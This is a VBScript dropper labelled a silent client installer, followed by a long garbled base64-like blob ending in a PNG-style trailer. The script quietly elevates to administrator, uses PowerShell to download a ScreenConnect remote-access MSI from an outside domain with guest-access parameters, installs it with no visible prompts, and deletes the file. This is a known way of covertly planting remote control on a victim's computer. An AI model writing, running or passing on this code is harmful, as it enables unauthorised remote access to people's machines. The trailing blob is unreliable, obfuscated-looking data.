' client Silent Installer - No Popups
Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Check if running as Administrator
If Not WScript.Arguments.Named.Exists("elevate") Then
    ' Relaunch as Administrator silently
    Set ShellApp = CreateObject("Shell.Application")
    ShellApp.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ /elevate", "", "runas", 0
    WScript.Quit
End If

' Set paths
msiUri = "https://r-is.co.uk/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
msiPath = "C:\Windows\Temp\form.msi"

' Download the MSI silently using PowerShell
downloadCommand = "powershell -Command ""Try { (New-Object Net.WebClient).DownloadFile('" & msiUri & "', '" & msiPath & "'); Exit 0 } Catch { Exit 1 }"""
WshShell.Run downloadCommand, 0, True

' Check if download worked and install
If fso.FileExists(msiPath) Then
    ' Install the MSI completely silently
    WshShell.Run "msiexec /i """ & msiPath & """ /qn /norestart", 0, True
    ' Clean up downloaded file silently
    On Error Resume Next
    fso.DeleteFile(msiPath)
End If

' Exit silently
WScript.Quit


'f2/Pjh1aogaKgSQlaRPnzgk0UDWoIFEBEZWgEqoqkZSqQJHapPluWgp3Z6e91PbdJYEkTZrGCRWkgqqiLQhUPiSktELwB/zVAALf2QlNQZTPNF'Gh1I7vdvjN2Wef73bn9tb7cafMSOedffPm6/ebmX07b9ZEOmgENAIaAY2ARuByQyCe201CcNjdNsJuQHj1i3sokT8RNgmXMQGSepCQzB0Pk4TL'nADJAd0bJgmagNJEAAmJ3FAYM0ETIAmYDBspmT8WNAmagDL88irEJurNPxEkCZqASgJk3BT3YSYcDYoETUA1AfJeiM1BkaAJsCKgTEJv/nG7ZK'/kmgAVkqbYQolhX0nQBKgIkGmCtoKEI/XU3KZrApwgJ2gbti0OO1FtVEcT4BQxYW7Hy9pjTtWd6mkCnCIl9YTY4TUJmoBqAgzuJ2JRLZ6+lyTE'c4em7+cY0QRUAziPhiDaoiSBxE7MhIPVWd3cawKsUMvGhohh/ahnwv0UHz5glb0RWVsjyi2pm8pfTeNt7yAqLiQuXkVkLMRavhB9WYCrfZcysW'MY5Vj3+aj8Y6O4CyQQZXsesEmvK7YruG7GplRInemi8eKNsN3XEps3oo1rEX93Q23t5MWUir02nSeex3JkggRVML5B2ehXVBp2aa1PQCIfw0px'J0bzBoC90q6jjuXVBMiMTkhg/jplYg85rmdKsTUJ6D1zDYnCHQBcAv/BRjut1LciQGZI5reSaaq3JVyQ0FoE9J3tpuIETjMAeBIRJZBuE'+0Ik'OXF89uwHNXZluD9lI191Wn1rWEF9Y0ux37MSSpMDGPEf8E38Ouhlo1iBhjb1WriITy896p1ZlKbewbEX4W18tY'+rPF3Y9TP0WIrvVy9ga5fAI'H40TjMTBPmZhH3JgydIuIwi67cQJkl52cgsoglh7eTSYctUipEvBczIV4hsIwyzChrW4zbVlOm'+4+WuYIQJvOf'hnfqSYCzqLHq'+C0Q9juAe'xpwnqZI5DSZ80fpQ4sv0nqA7FVwQgJTljI9CVWVcxxVqqJdpu3NvR1j9AAeePc0UMKbxPxjMvh71D7vZ5S6dqyBv'O5U0z1HsNRgzgj7DTpBcU'pigKd7knaVNBcBidGP0MXCM2jsUrsGz5Iz/xSj/CR1LvgJpRb9b1ZaEDeZ2GGcKWLMVPu9IZMS2MoWlIn2WjWpeQh'IjNyOt9WnAWinVUNnZHI'tFz+k9rZ'+6u9+eUYeUiwdewwkSGe'+PQnCTEIHMyHWV93K5rCC5HpK5nOYzvXAf4HaxRq8+t/eFOCX0ZQkMO8q31peTdELEgaq08IlQJ5OTuT2lywKIRRt'4X8TRe6EVfFZ6u/5fXUnm'uI'+EzvkiIREDtvdM0HR6Rkl32KTB2Pr7KHwc8SRVZRdKZ8NzR0kCYbxgLKRQvRhJjxa1gmPgNL5fJzJtAtMBZiS'mzHq18Mc/pedWtPJ09GDxMaDy'naZYjdeLPdInXAISOa/iAfp9CioaSzzGyTabgX4QzVprSDIRA8AWfXMFvQwTNRU8FZQMr8ONj5esGwC06vUF'rkVD9k/2Gi0htg03gvDQt1W01A'9+NR5XaXKPR0hfoC87db5+TXqoI+3PPjSsCBTvQwZtAc+hD3BLUEpkF0sfhsELLAEn'+l1ao/cQqmec5bprSKM5/ahj+rlRzr'+0z0p2aXgCLg0shMN+5gNjm+SgTW/1ZcdCT5hN1QVmAfwQvZwWSUYAvpyUbwpDpYrrbky302D3b'+ukbeSoLQF7QD8TGx3Zbf8J'+BZOE4K4iRGxvzKiqfjTN+EK'+/56ftWjMRzWcxutRPG4EH0cxb4sqv'+W0Evj9yFem6yxJU5Rx0L7rdMaxWhBJ/E15TNZSNN6WjNPpDM4+8MkKOfTMuKUfcEtfEdoexiKtFqID'ExnKkLvkEZu51QWZO/BMjRL2iFdZf4C'e'qP/tY6rQWkEny5368K0iGj8AXIrP4tQSnRRuP5mjWv1F7mi9RxxaOqtrtKk3UW8svJNN4HL'+MSl'LEYvyVYn7uwUYZnkHwO4SpoPtyPNu8ikZvrbn0kh9N4x6oPfh1vmOyjfwRcysnRv1xWUhNYDFDqmtdr5I0Ijot2+nMOB69YHr5aA3DXgPB'V'A'Btb2sXakqZPwU15YK0dsUSdRRtipoqcBF/pZgTZ'+/DAVetMFecfAYJxosyil3KrYV6sztGOWvxKkuQIzgAV1wH0T9K53M0o/srZdVjUZ1OUK3'EiP4htFDWwk'+CrH8oVlftDQPzMChITayvqqYgaQ5TiSxUCdTQ5egOJojz1tp7M4rJJZZ'+BtmqRdKaY8GypwuTBLMfgy6L8IYBLp9Zqm8p0iT'oi36pNqJKkXnkPjV/aiHX8LjIL3VWpwd9KJ4r0aKmCi1Nxsjh/CCDxeZu2fp9SK/5pk0bU'O3oTRvl2Ghv7HHTUa7FtIR4nSPClE0UZcDg3E1V'vQdjk956AZO56jJZVlvVF6ISlPJH/DNbyR6hY+LBlujvhBCyePyHrX/H7T'+nHU9fJ'+wcB7FXKoqXnyqwDPuMITcbdyWhZt/cECL5t9oNxqovS9Lw+'+stZHU7mPgFzbgBLzUdnyRu9YcIBMv4NsuXwZpOHiZmjtuhZPGsKtkXFh'+9Fmj0Bk+Bbm9EzhR7EwSv1tvOMrmXMBwJMm1EsXpw'+mbZ7+ANU4IMYXessW1VPyPwXWEKnyBCnYDeeovSyv9XL0lC6dBdKt6EqMB'+Cqan2/6ryT6V5TwDBLrcyP4l'+Tvv/fgWdv/gINud2Yfo3Vjf'z''KwD9KeK2ZyizfMRB39ypjGEpJNqozDwJvvoYirKAmcTGQJjJZx2T5/aLE12WiWy8jc5fwFJBeEu11LAS4sghP'U8ROolti1/gBcd5TqvSnM'nqgX8YI98T8GVzvCWA8HmQXTDNA3ZJtXI'+hwO2Wep459OU6vpvKX2gVitwCbMEf6eX9XpLgDBtXr4cNlkuM8xpWrryKdrEsGKaKLBxBNaOp'+'DL3nlMAF3rCjLms8g3SB3R7ygtF1eFe5CJ6XGAv8ODkmqK8JYAYph1DSzTzGPQ76dl0f1NN'+LLUDEdhalZ56uYsnLjV48JKH1/66wVDKsoEtl'CA91y9DdnMOCzSMfwXZh/wWMCaGHdpjL9A9/X7aJMk5/1ZD5Gg9FtlK7bozkpeEuAqLcE8Qv'wiXyJsksvzKnVfmeW4KejW4Mwe70lgOyWIPkB'HPdReuXeIDo1J34MHsLIDwR82U6vfcK1O5hyyTHoU7Aisk0PPvNxgL8lyHZ6TUDV4ONfUQffg'AfZS1UJzXh7AsvO5iDBlyB4vARV4so/okWRD'bSje7xS2pRxeTgsHbsvaPAlFj4RwN'+lzuiXaYdiO7hZmJgEf1MY4PtDQIAWxNw55Cex7IQGvmy/t8+A0pfhsUAfYu5JAPiZ6MawRn653d4S4O'AgUrni0K/ZWL9j8KWb1afgLQE'+NTLUYqX3ziR43vwJmgAVrskz74frFOCLq1Vqc0nTBNiht3t0Nc4knYLr9F12Kl7INQFWKCZGV9FE8UWMfGv'3qlUelzJNQDVwfSM9RIVAwJdVa'wIqCZD/Y7RYfAk'+''pcb'+1WVlGQ3GNQGVgI0bXUGCL6vWBFQSEEJcExAC6JVVagIq0QghrgkIAfTKKu23o0VxNf6lJT5qu4yCKF4XdG/tCSDxbNCNCb'+'+Bs40edRYvQR5BKTbYjQBbpHzKJ8mwCMg3RajCXCLnEf5NAEeAamL0QhoBDQCGgGNgEagxRD4P4koPOQHmKVOAAAAAElFTkSuQmCC">






